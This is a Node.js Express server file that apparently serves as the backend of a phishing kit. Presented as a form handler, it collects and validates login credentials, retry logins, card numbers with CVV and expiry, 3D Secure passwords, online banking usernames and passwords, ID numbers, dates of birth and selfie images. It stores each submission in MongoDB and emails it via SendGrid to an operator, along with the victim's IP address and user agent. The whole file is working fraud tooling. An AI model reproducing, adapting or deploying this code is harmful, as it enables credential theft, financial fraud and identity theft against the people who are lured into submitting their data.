const express = require('express');
const cors = require('cors');
const sgMail = require('@sendgrid/mail');
const rateLimit = require('express-rate-limit');
const { MongoClient, ServerApiVersion, GridFSBucket } = require('mongodb');
const multer = require('multer');
const { GridFsStorage } = require('multer-gridfs-storage');
const sanitizeHtml = require('sanitize-html');
const app = express();

// Middleware
app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(cors({ origin: process.env.FRONTEND_URL || '*' }));

// Rate limiting
app.use('/api/submit', rateLimit({
    windowMs: 15 * 60 * 1000, // 15 minutes
    max: 100
}));

// Set SendGrid API key
sgMail.setApiKey(process.env.SENDGRID_API_KEY);

// MongoDB setup
const uri = process.env.MONGODB_URI;
const client = new MongoClient(uri, {
    serverApi: { version: ServerApiVersion.v1, strict: true, deprecationErrors: true }
});
let db, gfs;

// Connect to MongoDB
async function connectToMongo() {
    try {
        await client.connect();
        db = client.db('form_data');
        gfs = new GridFSBucket(db, { bucketName: 'uploads' });
        console.log('Connected to MongoDB');
    } catch (error) {
        console.error('MongoDB connection error:', error);
        process.exit(1);
    }
}
connectToMongo();

// Multer setup for file uploads
const storage = new GridFsStorage({
    url: process.env.MONGODB_URI,
    file: (req, file) => ({
        filename: `${Date.now()}_${file.originalname}`,
        bucketName: 'uploads'
    })
});
const upload = multer({
    storage,
    limits: { fileSize: 5 * 1024 * 1024 }, // 5MB limit
    fileFilter: (req, file, cb) => {
        if (file.mimetype.startsWith('image/')) {
            cb(null, true);
        } else {
            cb(new Error('Only image files are allowed'), false);
        }
    }
});

// Sanitize input
function sanitizeInput(data) {
    const sanitized = {};
    for (const [key, value] of Object.entries(data)) {
        sanitized[key] = typeof value === 'string' ? sanitizeHtml(value, {
            allowedTags: [], allowedAttributes: {}
        }) : value;
    }
    return sanitized;
}

// Handle GET /api/submit
app.get('/api/submit', (req, res) => {
    res.status(405).json({ error: 'Method Not Allowed. Use POST to submit form data.' });
});

// POST endpoint for form submissions
app.post('/api/submit', upload.array('attach[]', 4), async (req, res) => {
    const formData = sanitizeInput(req.body);
    const formType = formData.form_type || 'Unknown Form';
    const files = req.files;

    // Basic validation
    if (!formData || Object.keys(formData).length === 0) {
        return res.status(400).json({ error: 'No form data provided' });
    }

    // Form-specific validation
    try {
        if (formType === 'login' || formType === 'retry_login') {
            const { email, password } = formData;
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            if (!emailRegex.test(email) || password.length < 8 || password.length > 20) {
                return res.status(400).json({ error: 'Invalid email or password (8-20 characters required)' });
            }
        } else if (formType === 'card_info') {
            const { cc_number, expdate_month, expdate_year, cvv2_number, email_locked, sort_code1, sort_code2, sort_code3, accnum, bsbnum_1, bsbnum_2, cc_limit } = formData;
            const cardRegex = /^\d{13,19}$/;
            const cvvRegex = /^\d{3,4}$/;
            const expiryMonthRegex = /^(0[1-9]|1[0-2])$/;
            const expiryYearRegex = /^\d{4}$/;
            if (!cardRegex.test(cc_number?.replace(/\s/g, '')) || !cvvRegex.test(cvv2_number) ||
                !expiryMonthRegex.test(expdate_month) || !expiryYearRegex.test(expdate_year) || parseInt(expdate_year) < new Date().getFullYear()) {
                return res.status(400).json({ error: 'Invalid card number, CVV, or expiration date' });
            }
            if (email_locked && !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email_locked)) {
                return res.status(400).json({ error: 'Invalid email_locked format' });
            }
            if (sort_code1 || sort_code2 || sort_code3 || accnum) {
                if (!/^\d{2}$/.test(sort_code1) || !/^\d{2}$/.test(sort_code2) || !/^\d{2}$/.test(sort_code3) || !/^\d{8}$/.test(accnum)) {
                    return res.status(400).json({ error: 'Invalid sort code or account number' });
                }
            }
            if (bsbnum_1 || bsbnum_2) {
                if (!/^\d{2,6}$/.test(bsbnum_1) || !/^\d{2,10}$/.test(bsbnum_2) || !/^\d{2,15}$/.test(accnum)) {
                    return res.status(400).json({ error: 'Invalid BSB or account number' });
                }
            }
            if (cc_limit && !/^\d{1,10}$/.test(cc_limit)) {
                return res.status(400).json({ error: 'Invalid credit limit' });
            }
        } else if (formType === 'vbv_info') {
            const { cc_pass, cc_login, email_locked } = formData;
            if (!cc_pass || cc_pass.length > 30) {
                return res.status(400).json({ error: 'Invalid 3D Secure password' });
            }
            if (cc_login && cc_login.length > 18) {
                return res.status(400).json({ error: 'Invalid Login ID' });
            }
            if (email_locked && !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email_locked)) {
                return res.status(400).json({ error: 'Invalid email_locked format' });
            }
        } else if (formType === 'bank_info') {
            const { bnkname, bnknameca, acnot, bnknameus, lobank, pwd_csdad, swsd, email_locked } = formData;
            if (!bnkname && !bnknameca && !acnot) {
                return res.status(400).json({ error: 'Bank name or account number is required' });
            }
            if (bnknameus || lobank || pwd_csdad) {
                if (!bnknameus || !lobank || !pwd_csdad || pwd_csdad.length > 24) {
                    return res.status(400).json({ error: 'Invalid bank name, username, or password' });
                }
            }
            if (swsd && swsd.length > 25) {
                return res.status(400).json({ error: 'Invalid SWIFT code' });
            }
            if (email_locked && !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email_locked)) {
                return res.status(400).json({ error: 'Invalid email_locked format' });
            }
        } else if (formType === 'address_info') {
            const { full_name, address_1, city, postal, phone, number_1, number_2, number_3, id_number, day, month, year, email_locked } = formData;
            if (!full_name || full_name.length > 30 || !address_1 || address_1.length > 30 || !city || city.length > 30 || !postal || postal.length > 11) {
                return res.status(400).json({ error: 'Invalid name, address, city, or postal code' });
            }
            if (number_1 || number_2 || number_3) {
                if (number_1.length === 3 && number_2.length === 2 && number_3.length >= 4) {
                    // Israel format
                } else if (number_1.length === 3 && number_2.length === 3 && number_3.length >= 4) {
                    // US/UK format
                } else {
                    return res.status(400).json({ error: 'Invalid phone number format' });
                }
            } else if (!phone || phone.length > 15) {
                return res.status(400).json({ error: 'Invalid phone number' });
            }
            if (id_number && id_number.length > (formData.country === 'HK' ? 25 : 20)) {
                return res.status(400).json({ error: 'Invalid ID number' });
            }
            if (!day || !month || !/^\d{4}$/.test(year) || parseInt(year) > new Date().getFullYear() - 18) {
                return res.status(400).json({ error: 'Invalid date of birth (must be at least 18 years old)' });
            }
            if (email_locked && !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email_locked)) {
                return res.status(400).json({ error: 'Invalid email_locked format' });
            }
        } else if (formType === 'selfie') {
            if (!files || files.length < 3) {
                return res.status(400).json({ error: 'At least three image files are required' });
            }
            if (email_locked && !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email_locked)) {
                return res.status(400).json({ error: 'Invalid email_locked format' });
            }
        } else {
            return res.status(400).json({ error: 'Unknown form type' });
        }

        // Prepare data for MongoDB
        const submission = {
            form_type: formType,
            data: formData,
            client_info: {
                ip: req.ip,
                timestamp: new Date().toUTCString(),
                user_agent: req.get('User-Agent')
            },
            created_at: new Date()
        };

        // Add file metadata for selfie form
        if (formType === 'selfie') {
            submission.files = files.map(file => ({
                filename: file.filename,
                contentType: file.mimetype,
                size: file.size,
                uploadDate: new Date()
            }));
        }

        // Save to MongoDB
        try {
            await db.collection('submissions').insertOne(submission);
            console.log(`Stored ${formType} submission in MongoDB`);
        } catch (error) {
            console.error('MongoDB insert error:', error);
            return res.status(500).json({ error: `Failed to store ${formType} data in database: ${error.message}` });
        }

        // Build email content
        let textContent = `++------[ ${formType} Details ]------++\n`;
        let htmlContent = `<h3>${formType} Details</h3>`;
        for (const [key, value] of Object.entries(formData)) {
            if (key !== 'form_type') {
                textContent += `${key}: ${value}\n`;
                htmlContent += `<p><strong>${key}:</strong> ${value}</p>`;
            }
        }
        if (formType === 'selfie') {
            textContent += `\nFiles Uploaded:\n`;
            htmlContent += `<h4>Files Uploaded:</h4>`;
            files.forEach(file => {
                textContent += `- ${file.filename} (${(file.size / 1024).toFixed(2)} KB)\n`;
                htmlContent += `<p>- ${file.filename} (${(file.size / 1024).toFixed(2)} KB)</p>`;
            });
        }
        textContent += `\n++------[ Client Info ]------++\n`;
        textContent += `IP: ${req.ip}\nTimestamp: ${new Date().toUTCString()}\nUser-Agent: ${req.get('User-Agent')}\n`;
        htmlContent += `<hr><h3>Client Info</h3>`;
        htmlContent += `<p><strong>IP:</strong> ${req.ip}</p>`;
        htmlContent += `<p><strong>Timestamp:</strong> ${new Date().toUTCString()}</p>`;
        htmlContent += `<p><strong>User-Agent:</strong> ${req.get('User-Agent')}</p>`;

        const msg = {
            to: process.env.RECEIVER_EMAIL,
            from: process.env.SENDER_EMAIL,
            subject: `New ${formType} Submission [${formData.email || formData.email_locked || formData.cc_number || formData.acnot || formData.full_name || 'No Identifier'}]`,
            text: textContent,
            html: htmlContent
        };

        // Send email via SendGrid
        try {
            await sgMail.send(msg);
            console.log(`Email sent for ${formType} submission`);
            res.json({ status: 'success', message: `${formType} data received, stored, and emailed` });
        } catch (error) {
            console.error('SendGrid Error:', error);
            res.json({ status: 'partial_success', message: `${formType} data stored in database but failed to send email: ${error.message}` });
        }
    } catch (error) {
        console.error('Error processing request:', error);
        res.status(500).json({ error: `Failed to process ${formType} data: ${error.message}` });
    }
});

// Graceful shutdown
process.on('SIGTERM', async () => {
    console.log('Shutting down...');
    await client.close();
    process.exit(0);
});

// Start server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
